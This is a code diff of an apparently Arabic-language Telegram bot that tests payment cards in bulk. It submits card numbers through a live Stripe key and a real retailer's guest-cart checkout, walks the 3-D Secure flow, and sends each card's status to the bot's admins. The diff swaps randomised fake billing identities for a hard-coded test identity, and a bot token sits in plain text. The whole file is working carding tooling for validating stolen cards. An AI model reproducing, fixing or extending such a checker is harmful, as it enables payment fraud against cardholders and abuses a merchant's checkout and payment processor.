@@ -1,7 +1,5 @@
 import os
 import asyncio
-import random
-import string
 from datetime import datetime
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
@@ -12,43 +10,6 @@ import base64
 # ========== الإعدادات ==========
 BOT_TOKEN = "8166484030:AAHwrm95j131yJxvtlNTAe6S57f5kcfU1ow"
 ADMIN_IDS = [5895491379, 844663875]
-
-# ========== Cart ID - غيره من هنا ==========
-CART_ID = "0Xodo8RBE1CCeaoEix4npV5G3OYOBxOM"
-
-# ========== بيانات وهمية ==========
-FIRST_NAMES = ["John", "Mike", "Sarah", "Emma", "David", "Lisa", "Tom", "Anna", "James", "Maria"]
-LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Wilson", "Moore"]
-STREETS = ["Main Street", "Oak Avenue", "Park Road", "Cedar Lane", "Maple Drive", "Hill Street", "Lake View", "Forest Road"]
-CITIES = ["Springfield", "Madison", "Franklin", "Clinton", "Georgetown", "Salem", "Bristol", "Oxford"]
-
-def generate_fake_data():
-    """توليد بيانات وهمية عشوائية"""
-    first = random.choice(FIRST_NAMES)
-    last = random.choice(LAST_NAMES)
-    street_num = random.randint(100, 999)
-    street = random.choice(STREETS)
-    city = random.choice(CITIES)
-    state = random.choice(["CO", "CA", "NY", "TX", "FL"])
-    zipcode = ''.join(random.choices(string.digits, k=5))
-    phone = ''.join(random.choices(string.digits, k=10))
-    
-    # بريد إلكتروني عشوائي
-    random_chars = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
-    email = f"{first.lower()}{random_chars}@{random.choice(['gmail.com', 'yahoo.com', 'hotmail.com'])}"
-    
-    return {
-        'firstname': first,
-        'lastname': last,
-        'email': email,
-        'phone': phone,
-        'street1': f"{street_num} {street}",
-        'street2': ''.join(random.choices(string.ascii_uppercase, k=4)),
-        'city': city,
-        'state': state,
-        'zipcode': zipcode,
-        'full_name': f"{first} {last}"
-    }
 
 # ========== إحصائيات ==========
 stats = {
@@ -86,9 +47,6 @@ class StripeChecker:
         
     def check(self, card_number, exp_month, exp_year, cvv):
         try:
-            # توليد بيانات وهمية جديدة
-            fake = generate_fake_data()
-            
             headers = self.headers.copy()
             headers.update({
                 'content-type': 'application/x-www-form-urlencoded',
@@ -96,13 +54,12 @@ class StripeChecker:
                 'referer': 'https://js.stripe.com/',
             })
             
-            data = f'billing_details[address][state]={fake["state"]}&billing_details[address][postal_code]={fake["zipcode"]}&billing_details[address][country]=US&billing_details[address][city]={fake["city"]}&billing_details[address][line1]={requests.utils.quote(fake["street1"])}&billing_details[address][line2]={fake["street2"]}&billing_details[email]={fake["email"]}&billing_details[name]={requests.utils.quote(fake["full_name"])}&billing_details[phone]={fake["phone"]}&type=card&card[number]={card_number}&card[cvc]={cvv}&card[exp_year]={exp_year}&card[exp_month]={exp_month}&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&_stripe_version=2020-03-02'
+            data = f'billing_details[address][state]=CO&billing_details[address][postal_code]=11333&billing_details[address][country]=US&billing_details[address][city]=Napoleon&billing_details[address][line1]=111+North+Street&billing_details[address][line2]=sagh&billing_details[email]=test@test.com&billing_details[name]=Card+Test&billing_details[phone]=3609998856&type=card&card[number]={card_number}&card[cvc]={cvv}&card[exp_year]={exp_year}&card[exp_month]={exp_month}&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&_stripe_version=2020-03-02'
             
             r = self.session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
             pm = r.json()
             if 'id' not in pm:
-                error_msg = pm.get('error', {}).get('message', 'Unknown error')
-                return 'DECLINED', f'❌ فشل إنشاء طريقة الدفع: {error_msg}'
+                return 'DECLINED', 'Payment method creation failed'
             pm_id = pm['id']
             
             headers = self.headers.copy()
@@ -113,50 +70,28 @@ class StripeChecker:
             })
             
             payload = {
-                'cartId': CART_ID,
+                'cartId': 'Po9ukXigB3Dus69b8SJERtt2J6UpCXMp',
                 'billingAddress': {
                     'countryId': 'US',
                     'regionId': '13',
-                    'street': [fake['street1'], fake['street2']],
-                    'telephone': fake['phone'],
-                    'postcode': fake['zipcode'],
-                    'city': fake['city'],
-                    'firstname': fake['firstname'],
-                    'lastname': fake['lastname'],
+                    'street': ['111 North Street', 'sagh'],
+                    'telephone': '3609998856',
+                    'postcode': '11333',
+                    'city': 'Napoleon',
+                    'firstname': 'Card',
+                    'lastname': 'Test',
                 },
                 'paymentMethod': {
                     'method': 'stripe_payments',
                     'additional_data': {'payment_method': pm_id},
                 },
-                'email': fake['email'],
+                'email': 'test@test.com',
             }
             
-            r = self.session.post(f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/payment-information', headers=headers, json=payload)
+            r = self.session.post('https://www.ironmongeryworld.com/rest/default/V1/guest-carts/Po9ukXigB3Dus69b8SJERtt2J6UpCXMp/payment-information', headers=headers, json=payload)
             res = r.json()
-            
-            # طباعة الـ Response للتشخيص
-            print(f"[DEBUG] Payment Intent Response: {res}")
-            
             if 'message' not in res or 'pi_' not in res['message']:
-                # محاولة الحصول على تفاصيل أكثر من الرد
-                if isinstance(res, dict):
-                    if 'message' in res:
-                        error_msg = res['message']
-                        # التحقق من أخطاء شائعة
-                        if 'expired' in str(error_msg).lower():
-                            return 'DECLINED', f'❌ السلة منتهية الصلاحية - جرب Cart ID جديد'
-                        elif 'not found' in str(error_msg).lower():
-                            return 'DECLINED', f'❌ السلة غير موجودة - تأكد من Cart ID'
-                        elif 'already' in str(error_msg).lower():
-                            return 'DECLINED', f'❌ السلة مستخدمة بالفعل - احتاج Cart ID جديد'
-                        else:
-                            return 'DECLINED', f'❌ خطأ في السلة: {error_msg}'
-                    elif 'parameters' in res:
-                        return 'DECLINED', f'❌ خطأ في البيانات: {res.get("parameters", "")}'
-                    else:
-                        return 'DECLINED', f'❌ رد غير متوقع: {str(res)[:100]}'
-                return 'DECLINED', f'❌ فشل إنشاء Payment Intent - الرد: {str(res)[:150]}'
-            
+                return 'DECLINED', 'Payment intent creation failed'
             client_secret = res['message'].split(': ')[1]
             pi_id = client_secret.split('_secret_')[0]
             
@@ -171,14 +106,7 @@ class StripeChecker:
             pi = r.json()
             
             if 'next_action' not in pi:
-                # التحقق من الحالة
-                pi_status = pi.get('status', 'unknown')
-                if 'last_payment_error' in pi:
-                    error_info = pi['last_payment_error']
-                    decline_code = error_info.get('decline_code', 'unknown')
-                    error_message = error_info.get('message', 'Unknown error')
-                    return 'DECLINED', f'🚫 البطاقة مرفوضة - {decline_code}: {error_message}'
-                return 'DECLINED', f'❌ لا يوجد 3DS - الحالة: {pi_status}'
+                return 'DECLINED', 'No 3DS action required'
             
             source = pi['next_action']['use_stripe_sdk']['three_d_secure_2_source']
             trans_id = pi['next_action']['use_stripe_sdk']['server_transaction_id']
@@ -213,25 +141,16 @@ class StripeChecker:
             
             if 'ares' in auth:
                 status = auth['ares'].get('transStatus', 'UNKNOWN')
-                
-                # رسائل توضيحية لكل حالة
-                status_messages = {
-                    'Y': '✅ تمت المصادقة بنجاح - البطاقة صحيحة',
-                    'N': '❌ فشلت المصادقة - البطاقة مرفوضة من البنك',
-                    'U': '🔴 المصادقة غير متاحة - البنك لا يدعم 3DS',
-                    'A': '🔵 محاولة المصادقة - لم يتم التأكيد الكامل',
-                    'C': '⚠️ مطلوب تحدي - يحتاج تأكيد إضافي',
-                    'R': '🚫 مرفوض من الجهة المصدرة - البنك رفض العملية'
-                }
-                
                 if status == 'R':
-                    return 'DECLINED', status_messages.get(status, f'حالة مجهولة: {status}')
+                    return 'DECLINED', 'Rejected by issuer'
                 
+                # إذا كانت الحالة C، نفحص الـ Challenge
                 if status == 'C' and 'creq' in auth and 'ares' in auth and 'acsURL' in auth['ares']:
                     try:
                         creq = auth['creq']
                         acs_url = auth['ares']['acsURL']
                         
+                        # إعداد headers مع cookies للطلب
                         challenge_headers = {
                             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                             'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
@@ -253,6 +172,7 @@ class StripeChecker:
                         
                         challenge_data = {'creq': creq}
                         
+                        # إرسال الطلب
                         challenge_response = self.session.post(
                             acs_url,
                             headers=challenge_headers,
@@ -261,8 +181,10 @@ class StripeChecker:
                             allow_redirects=True
                         )
                         
+                        # فحص الرد
                         html_response = challenge_response.text
                         
+                        # فحص جميع حالات الفشل
                         failure_keywords = [
                             'Authentication failed',
                             'authentication failed',
@@ -273,17 +195,17 @@ class StripeChecker:
                         ]
                         
                         if any(keyword in html_response.lower() for keyword in [k.lower() for k in failure_keywords]):
-                            return 'FAILED_AUTH', '❌ فشلت المصادقة في التحدي - البطاقة مرفوضة'
+                            return 'FAILED_AUTH', 'Authentication failed in challenge'
                         
                     except Exception as e:
+                        # لو حصل خطأ في الفحص، نكمل عادي ونعتبرها C
                         pass
                 
-                return status, status_messages.get(status, f'حالة: {status}')
-            
-            return 'DECLINED', '❌ فشلت المصادقة - لا توجد استجابة من السيرفر'
+                return status, f'3DS Status: {status}'
+            return 'DECLINED', 'Authentication failed'
             
         except Exception as e:
-            return 'ERROR', f'⚠️ خطأ في الاتصال: {str(e)}'
+            return 'ERROR', str(e)
 
 async def send_result(bot_app, card, status_type, message):
     try:
@@ -381,12 +303,6 @@ async def check_card(card, bot_app):
             stats['checking'] -= 1
             stats['last_response'] = 'Failed Auth ❌'
             await update_dashboard(bot_app)
-            # إرسال رسالة الرفض
-            await bot_app.bot.send_message(
-                chat_id=stats['chat_id'],
-                text=f"❌ **FAILED AUTH**\n💳 `{card}`\n📛 السبب: {message}",
-                parse_mode='Markdown'
-            )
             return card, "FAILED_AUTH", message
             
         elif status == 'C':
@@ -410,12 +326,6 @@ async def check_card(card, bot_app):
             stats['checking'] -= 1
             stats['last_response'] = 'Not Auth ❌'
             await update_dashboard(bot_app)
-            # إرسال رسالة الرفض
-            await bot_app.bot.send_message(
-                chat_id=stats['chat_id'],
-                text=f"❌ **NOT AUTHENTICATED**\n💳 `{card}`\n📛 السبب: {message}",
-                parse_mode='Markdown'
-            )
             return card, "N", message
             
         elif status == 'U':
@@ -423,12 +333,6 @@ async def check_card(card, bot_app):
             stats['checking'] -= 1
             stats['last_response'] = 'Unavailable 🔴'
             await update_dashboard(bot_app)
-            # إرسال رسالة الرفض
-            await bot_app.bot.send_message(
-                chat_id=stats['chat_id'],
-                text=f"🔴 **UNAVAILABLE**\n💳 `{card}`\n📛 السبب: {message}",
-                parse_mode='Markdown'
-            )
             return card, "U", message
             
         elif status == 'DECLINED' or status == 'R':
@@ -436,12 +340,6 @@ async def check_card(card, bot_app):
             stats['checking'] -= 1
             stats['last_response'] = 'Declined/Rejected ❌'
             await update_dashboard(bot_app)
-            # إرسال رسالة الرفض
-            await bot_app.bot.send_message(
-                chat_id=stats['chat_id'],
-                text=f"❌ **DECLINED/REJECTED**\n💳 `{card}`\n📛 السبب: {message}",
-                parse_mode='Markdown'
-            )
             return card, "DECLINED", message
             
         else:
@@ -449,12 +347,6 @@ async def check_card(card, bot_app):
             stats['checking'] -= 1
             stats['last_response'] = f'{status}'
             await update_dashboard(bot_app)
-            # إرسال رسالة الخطأ
-            await bot_app.bot.send_message(
-                chat_id=stats['chat_id'],
-                text=f"⚠️ **ERROR**\n💳 `{card}`\n📛 السبب: {status} - {message}",
-                parse_mode='Markdown'
-            )
             return card, status, message
             
     except Exception as e:
@@ -663,9 +555,9 @@ async def process_cards(cards, bot_app):
     await update_dashboard(bot_app)
     
     summary_text = (
-        "┏━━━━━━━━━━━━━━━━━━┓\n"
+        "━━━━━━━━━━━━━━━━━━━\n"
         "✅ **اكتمل الفحص!** ✅\n"
-        "┗━━━━━━━━━━━━━━━━━━┛\n\n"
+        "━━━━━━━━━━━━━━━━━━━\n\n"
         f"📊 **الإحصائيات النهائية:**\n"
         f"🔥 الإجمالي: {stats['total']}\n"
         f"✅ Authenticated (Y): {stats['authenticated']}\n"
